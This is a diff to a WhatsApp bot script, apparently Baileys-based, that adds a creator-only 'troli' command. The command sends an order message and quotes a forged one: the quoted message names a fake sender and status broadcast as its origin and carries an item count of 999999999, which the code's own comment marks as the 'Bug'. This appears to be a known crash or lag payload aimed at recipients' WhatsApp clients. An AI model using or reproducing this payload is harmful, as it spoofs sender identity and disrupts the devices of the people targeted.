@@ -3491,6 +3491,51 @@ viewOnce: true
 };
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡"},{quoted:anu})
 break
+case 'troli': {
+	if (!isCreator) return
+a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+	var troli = generateWAMessageFromContent(m.chat,{
+
+	"orderMessage": {
+ 
+	"orderId": "599519108102353",
+ 
+	"thumbnail": fs.readFileSync('./menu1.jpeg'),
+ 
+	"itemCount": 2022,
+ 
+	"status": "INQUIRY",
+ 
+	"surface": "CATALOG",
+ 
+	"message": `Tes`,
+ 
+	"orderTitle": `Donk`, // 
+ 
+	"sellerJid": "6283131458282@s.whatsapp.net",
+	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+	}
+	},{quoted: {
+	key: {
+	fromMe: false,
+	participant: 
+	`0@s.whatsapp.net`, // Fake sender Jid
+	remoteJid: "status@broadcast"
+	},
+	message: {
+	orderMessage: {
+	itemCount: 999999999, // Bug
+	status: 1,
+	surface: 1,
+	message: '😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃',
+	orderTitle: '999999999', // Idk what this does
+	sellerJid: `0@s.whatsapp.net` // Seller
+	}
+	}
+	}, contextInfo:{}}) 
+	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
+	}
+	break
 case 'sendreaksi' : {
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
